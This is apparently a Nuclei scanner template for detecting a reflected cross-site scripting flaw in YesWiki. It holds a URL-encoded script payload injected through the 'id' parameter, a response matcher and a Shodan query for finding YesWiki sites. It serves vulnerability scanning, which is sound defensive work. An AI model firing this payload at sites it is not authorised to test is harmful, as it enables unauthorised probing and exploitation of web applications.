id: yeswiki-xss

info:
  name: YesWiki - Cross-site Scripting
  author: arafatansari
  severity: medium
  description: |
    YesWiki before 2022-07-07 allows Reflected Cross-site Scripting via the "id" parameter in the AccueiL URL.
  reference:
    - https://huntr.dev/bounties/de4db96c-2717-4c0e-b7aa-eee756ca19d3/
  metadata:
    shodan-query: http.html:"yeswiki"
    verified: "true"
  tags: xss,cve,2022

requests:
  - method: GET
    path:
      - '{{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(1)%3C/script%3E'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '<script>alert(1)</script>'
        condition: and
